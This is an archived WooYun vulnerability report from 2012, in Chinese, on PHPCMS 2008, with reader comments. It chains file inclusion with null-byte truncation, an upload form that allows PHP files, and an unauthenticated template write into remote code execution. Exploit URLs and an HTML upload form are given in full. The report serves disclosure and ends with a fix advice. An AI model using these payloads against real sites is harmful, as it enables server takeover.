{"id": 19022, "wybug_id": "wooyun-2012-09563", "wybug_title": "phpcms 2008多个漏洞 (可getshell)", "wybug_corp": "phpcms", "wybug_author": "b4dboy", "wybug_date": "2012-07-12 19:03", "wybug_open_date": "2012-07-17 19:03", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "文件包含漏洞", "源码审核", "代码执行", "敏感接口未加权限认证", "白盒测试", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 一个漏洞不可怕，可怕的是一连串的漏洞，拼接起来就可以getshell了。 详细说明：  \n###文件包含<?phpdefine('IN_YP', TRUE);define('ADMIN_ROOT', str_replace(\"\\\\\", '/',dirname(__FILE__)).'/');require '../include/common.inc.php';## 要登陆if(!$_userid) showmessage('您还没有登陆，即将跳转到登陆页面',$MODULE['member']['url'].'login.php?forward='.urlencode(URL));session_start();## $file变量可控制if(!isset($file) || empty($file)) $file = 'panel';/* $company_user_infos 获取企业会员信息 */$company_user_infos = $db->get_one(\"SELECT * FROM `\".DB_PRE.\"member_company` WHERE `userid`='$_userid'\");$userid = $_userid;## 注册的时候选择企业用户if(!$company_user_infos){\t$MS['title'] = '您不是企业会员';\t$MS['description'] = '你可以做下面操作';\t$MS['urls'][0] = array(\t\t'name'=>'免费升级为企业会员',\t\t'url'=>$PHPCMS['siteurl'].$M['url'].'company.php?action=member',\t\t);\t$MS['urls'][1] = array(\t\t'name'=>'退出当前帐号，换其他帐号登陆',\t\t'url'=>$PHPCMS['siteurl'].'member/logout.php',\t\t);\t$MS['urls'][2] = array(\t\t'name'=>'重新注册为企业会员',\t\t'url'=>$PHPCMS['siteurl'].'member/logout.php?forward='.urlencode($PHPCMS['siteurl'].'member/register.php'),\t\t);\tmsg($MS);}$CATEGORY = subcat('yp');$siteurl = company_url($userid, $company_user_infos['sitedomain']);$_SESSION['url'] = QUERY_STRING;if($file != 'company' && $M['enableSecondDomain'] && !$company_user_infos['sitedomain']) showmessage('请先绑定您的二级域名',BUSINESSDIR.'?file=company');check_priv($file);$GROUP = cache_read('member_group.php');## 此处直接包含了，注意$file是可以控制的但须要截断if(!@include ADMIN_ROOT.$file.'.inc.php') showmessage('The file ./yp/'.$file.'.inc.php is not exists!');function check_priv($file){\tglobal $M,$PHPCMS,$_groupid;\tif(!$M[\"allow_add_$file\"]) return true;\tif(!in_array($_groupid,$M[\"allow_add_$file\"]))\t{\t\t$MS['title'] = '您所在的会员组没有此项操作权限';\t\t$MS['description'] = '你可以做下面操作';\t\t$MS['urls'][0] = array(\t\t\t'name'=>'升级会员组',\t\t\t'url'=>$PHPCMS['siteurl'].'member/upgrade.php',\t\t\t);\t\t$MS['urls'][1] = array(\t\t\t'name'=>'返回商务中心',\t\t\t'url'=>'?',\t\t\t);\t\tmsg($MS);\t\t}}?>## 利用注册一个企业用户EXP:http://localhost/phpcms/yp/business/?file=../../xxoo.txt%00.由于涉及截断，所以鸡肋了，哥是要去拿shell的。## 再看这一句if(!@include ADMIN_ROOT.$file.'.inc.php') showmessage('The file ./yp/'.$file.'.inc.php is not exists!');以.inc.php结尾的文件有大把随便找个有漏的文件包含进来，不就能二次利用了？## 首先进入视线的是/admin/upload.inc.php 看名字就知道如果能利用的话，将会.....(省略500字)<?php defined('IN_PHPCMS') or exit('Access Denied');require_once 'attachment.class.php';$attachment = new attachment($mod);if($catid){\t$C = cache_read('category_'.$catid.'.php');}## 允许上传的后缀是从$C里取的，变量$C要通过上面那个判断才能赋值，典型的变量未初始化$upload_allowext = $C['upload_allowext'] ? $C['upload_allowext'] : UPLOAD_ALLOWEXT;$upload_maxsize = $C['upload_maxsize'] ? $C['upload_maxsize'] : UPLOAD_MAXSIZE;if($dosubmit){\t$attachment->upload('uploadfile', $upload_allowext, $upload_maxsize, 1);\tif($attachment->error) showmessage($attachment->error());\t//判断是否开启附件ftp上传，返回图片路径\t$imgurl = UPLOAD_FTP_ENABLE ? $attachment->uploadedfiles[0]['filepath'] : UPLOAD_URL.$attachment->uploadedfiles[0]['filepath'];\t\t$aid = $attachment->uploadedfiles[0]['aid'];\t$filesize = $attachment->uploadedfiles[0]['filesize'];\t$filesize = $attachment->size($filesize);    if($isthumb || $iswatermark)\t{\t\trequire_once 'image.class.php';\t\t$image = new image();\t\t$img = UPLOAD_ROOT.$attachment->uploadedfiles[0]['filepath'];\t\tif($isthumb)\t\t{\t\t\t$image->thumb($img, $img, $width, $height);\t\t}\t\tif($iswatermark)\t\t{\t\t\t$image->watermark($img, $img, $PHPCMS['watermark_pos'], $PHPCMS['watermark_img'], '', 5, '#ff0000', $PHPCMS['watermark_jpgquality']);\t\t}\t}\tshowmessage(\"文件上传成功！<script language='javascript'>\ttry{ $(window.opener.document).find(\\\"form[@name='myform'] #$uploadtext\\\").val(\\\"$imgurl\\\");$(window.opener.document).find(\\\"form[@name='myform'] #{$uploadtext}_aid\\\").val(\\\"$aid\\\");$(window.opener.document).find(\\\"form[@name='myform'] #$filesize\\\").val(\\\"$filesize\\\");}catch(e){} window.close();</script>\", HTTP_REFERER);}else{\tinclude admin_tpl('upload');}?>## 没什么好说的看EXP, 上传后查看网页源代码即可找到上传路径.<form id=\"frmUpload\" enctype=\"multipart/form-data\"action=\"http://localhost/phpcms/yp/business/?file=../../admin/upload&C[upload_allowext]=php|Php%00.|php%00&dosubmit=yes\" method=\"post\"><h1>Upload a new file:</h1><input type=\"file\" name=\"uploadfile\" size=\"50\"><br><input id=\"btnUpload\" type=\"submit\" value=\"Upload\"></form>## 传完后我才发现attachment.class.php 里有黑名单，怎么绕大家结合环境利用吧。## 漏洞再一次被鸡肋化了，哥继续找。 再次进入视线的是block.inc.php，看名字貌似是跟模块有关的，难不成可以写个shell ?## 猫了个咪，打开文件我就想骂人了，做为admin目录下的文件，没有任何权限判断。## 看144行左右，当$action 等于 post时。case 'post':\trequire_once 'template.func.php';\tif($func == 'dosave') ## 这里完全不用管他，让他进入else\t{\t\t$block->set_template($blockid, $template);\t\t$block->update($blockid, $data);\t\t$data = $block->get_html($blockid);\t}\telse\t{\t\t$name = new_stripslashes($name);\t\t$data = new_stripslashes($data);\t\t$data = $block->strip_data($data);\t\t$template = new_stripslashes($template);\t\t$tpldata = template_parse($template);\t\t$tplfile = TPL_CACHEPATH.'block_'.$blockid.'.preview.php'; \t## 文件名\t\tfile_put_contents($tplfile, $tpldata); \t\t\t\t\t\t## 生成文件\t\tinclude $tplfile; \t\t\t\t\t\t\t\t\t\t\t## 包含文件\t\t@unlink($tplfile); \t\t\t\t\t\t\t\t\t\t\t## 删除刚才生成的文件\t\t$data = ob_get_contents();\t\tob_clean();\t}\techo '<script language=\"JavaScript\">parent.'.$func.'('.$blockid.', \"'.format_js($data, 0).'\");</script>';\tbreak;## 在这里可以生成一个php文件，并马上包含进来，随后又删除了。由于包含进来了，只要能控制php文件的内容，代码还是会被执行。## 看取得文件内容的这一行，$tpldata = template_parse($template); 跟进template_parse函数function template_parse($str, $istag = 0){\t$str = preg_replace(\"/([\\n\\r]+)\\t+/s\",\"\\\\1\",$str);\t$str = preg_replace(\"/\\<\\!\\-\\-\\{(.+?)\\}\\-\\-\\>/s\", \"{\\\\1}\",$str);\t$str = preg_replace(\"/\\{template\\s+(.+)\\}/\",\"<?php include template(\\\\1); ?>\",$str);\t$str = preg_replace(\"/\\{include\\s+(.+)\\}/\",\"<?php include \\\\1; ?>\",$str);\t$str = preg_replace(\"/\\{php\\s+(.+)\\}/\",\"<?php \\\\1?>\",$str);\t$str = preg_replace(\"/\\{if\\s+(.+?)\\}/\",\"<?php if(\\\\1) { ?>\",$str);\t$str = preg_replace(\"/\\{else\\}/\",\"<?php } else { ?>\",$str);\t$str = preg_replace(\"/\\{elseif\\s+(.+?)\\}/\",\"<?php } elseif (\\\\1) { ?>\",$str);\t$str = preg_replace(\"/\\{\\/if\\}/\",\"<?php } ?>\",$str);\t$str = preg_replace(\"/\\{loop\\s+(\\S+)\\s+(\\S+)\\}/\",\"<?php if(is_array(\\\\1)) foreach(\\\\1 AS \\\\2) { ?>\",$str);\t$str = preg_replace(\"/\\{loop\\s+(\\S+)\\s+(\\S+)\\s+(\\S+)\\}/\",\"<?php if(is_array(\\\\1)) foreach(\\\\1 AS \\\\2 => \\\\3) { ?>\",$str);\t$str = preg_replace(\"/\\{\\/loop\\}/\",\"<?php } ?>\",$str);\t$str = preg_replace(\"/\\{\\/get\\}/\",\"<?php } unset(\\$DATA); ?>\",$str);\t$str = preg_replace(\"/\\{tag_([^}]+)\\}/e\", \"get_tag('\\\\1')\", $str);\t$str = preg_replace(\"/\\{get\\s+([^}]+)\\}/e\", \"get_parse('\\\\1')\", $str);\t$str = preg_replace(\"/\\{([a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff:]*\\(([^{}]*)\\))\\}/\",\"<?php echo \\\\1;?>\",$str);\t$str = preg_replace(\"/\\{\\\\$([a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff:]*\\(([^{}]*)\\))\\}/\",\"<?php echo \\\\1;?>\",$str);\t$str = preg_replace(\"/\\{(\\\\$[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*)\\}/\",\"<?php echo \\\\1;?>\",$str);\t$str = preg_replace(\"/\\{(\\\\$[a-zA-Z0-9_\\[\\]\\'\\\"\\$\\x7f-\\xff]+)\\}/es\", \"addquote('<?php echo \\\\1;?>')\",$str);\t$str = preg_replace(\"/\\{([A-Z_\\x7f-\\xff][A-Z0-9_\\x7f-\\xff]*)\\}/s\", \"<?php echo \\\\1;?>\",$str);\tif(!$istag) $str = \"<?php defined('IN_PHPCMS') or exit('Access Denied'); ?>\".$str;\treturn $str;}## 是用来处理一些模板语法，完全不用理会。EXP:http://localhost/yp/business/?file=../../admin/block&action=post&blockid=eval&template=<?php phpinfo();exit();?>\n   漏洞证明：  \n\n   修复方案：  判断要严谨，多个地方缺少判断，判断应该用白名单而不是黑名单，黑名单你控制不来的。Ps:换个马甲不知道人品会不会好一点，求邀请码。   版权声明：转载请注明来源 b4dboy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2012-07-17 19:03 厂商回复：  漏洞Rank：17  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-12 19:37 |    \t\t鱼化石 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:18        | 介绍不能为空)\t\t \n  值得关注    \n     2012-07-12 20:05 |    \t\tmoro \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | I am moro .)\t\t \n  这个厉害~~~    \n     2012-07-12 20:12 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  组合漏洞什么的最有爱了!!    \n     2012-07-12 20:55 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  关注    \n     2012-07-12 20:59 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  Freas 你改马甲了啊   啊啊啊啊啊    \n     2012-07-12 21:02 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  /whitehat_detail.php?whitehat=php0day 一个人 -_- 玩无间道    \n     2012-07-12 21:02 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  @蟋蟀哥哥 http://www.php0day.com/真的是他 百度空间    \n     2012-07-12 21:03 |    \t\tJmkissy \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        )\t\t \n  关注了-、    \n     2012-07-12 21:46 |    \t\tb4dboy \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:3        | good bye)\t\t \n  @_Evil 坏蛋蛋......    \n     2012-07-13 09:31 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  关注    \n     2012-07-13 14:20 |    \t\texploits \t\t\t( 实习白帽子  |\t\t\t        Rank:69 漏洞数:17        | As We Do，As You Know !)\t\t \n  关注啊~~    \n     2012-07-13 22:09 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  围观    \n     2012-07-17 20:15 |    \t\tb4dboy \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:3        | good bye)\t\t \n  被忽略了..........inurl:/yp/business    \n     2012-07-18 09:39 |    \t\tEric \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 网络技术爱好者。)\t\t \n  ....这个居然被忽略。证实可行啊。    \n     2012-07-19 14:25 |    \t\tca3tie1 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:4        | castiel)\t\t \n  经典的漏洞分析！！！！    \n     2012-07-19 14:32 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @ca3tie1 给好评啊    \n     2012-07-19 23:51 |    \t\tCreturn \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 静下心来，做自己想做的事情!)\t\t \n  其实不是被忽略2008已经早都停止维护了。    \n     2012-09-26 12:54 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  说是可以拿shell 可以个毛啊    \n     2012-12-19 09:32 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  ..yp/business/?file=../../admin/block&action=post&blockid=eval&template=<?php phpinfo();exit();?>    \n     2013-07-17 23:57 |    \t\tAzreal \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:21        | 菜鸟路过、寻找一夜菊花。)\t\t \n  phpcms貌似没有更新！    \n     2015-02-01 20:39 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  洞主功力深厚    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}